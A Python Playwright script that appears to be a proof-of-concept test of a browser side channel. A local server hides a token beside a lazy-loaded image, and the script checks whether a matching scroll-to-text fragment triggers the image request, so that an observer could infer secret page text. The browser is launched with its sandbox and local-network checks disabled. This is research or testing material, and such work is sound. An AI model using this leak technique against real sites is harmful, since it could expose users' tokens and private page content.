from playwright.sync_api import sync_playwright
import http.server, threading

requests_log = []

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        requests_log.append(self.path)
        if self.path.startswith('/target'):
            # Notice: huge spacing before token, and lazy image near token
            html = '''<!DOCTYPE html><html><body>
            <div style="height: 3000px;">Huge Top Spacing</div>
            <img loading="lazy" src="/lazy_probe" width="10" height="10">
            <div id="target">TOKEN_abc123</div>
            <div style="height: 1000px;">Bottom</div>
            </body></html>'''
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=UTF-8')
            self.send_header('Content-Security-Policy', "script-src 'none'; default-src 'self'; base-uri 'none'; frame-src 'none'; object-src 'none'")
            self.end_headers()
            self.wfile.write(html.encode())
        elif self.path == '/lazy_probe':
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.end_headers()
            self.wfile.write(b'')
        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=UTF-8')
            self.end_headers()
            self.wfile.write(b'<html><body>Attacker</body></html>')

server = http.server.HTTPServer(('127.0.0.1', 8892), Handler)
t = threading.Thread(target=server.serve_forever, daemon=True)
t.start()

with sync_playwright() as p:
    b = p.chromium.launch(args=[
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-features=LocalNetworkAccessChecks",
        "--js-flags=--jitless",
    ])
    page = b.new_page()

    # Case 1: Match
    requests_log.clear()
    page.goto('http://127.0.0.1:8892/target#:~:text=TOKEN_abc')
    page.wait_for_timeout(1000)
    print('Match requests:', requests_log)

    # Case 2: No match
    requests_log.clear()
    page.goto('http://127.0.0.1:8892/target#:~:text=TOKEN_WRONG')
    page.wait_for_timeout(1000)
    print('No match requests:', requests_log)

    b.close()
